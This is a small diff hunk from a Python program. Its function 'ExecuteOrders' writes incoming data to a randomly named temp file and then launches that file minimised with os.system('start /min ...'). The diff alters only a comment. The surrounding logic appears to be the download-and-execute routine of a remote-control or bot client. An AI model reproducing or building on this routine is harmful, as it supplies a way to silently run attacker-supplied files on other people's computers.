@@ -90,7 +90,7 @@ def ExecuteOrders():
                     F.write(Data)
                     Check = len(Data)
                     print(Check)
-                    if(1024 != Check): # If 1024 > len(Data) ; Stop Loop
+                    if(1024 != Check): # If 1024 > length (Data) , Stop Loop
                         F.close() # Close File
                         os.system('start /min '+Temp+"/"+Random+"."+Ex)
                         break
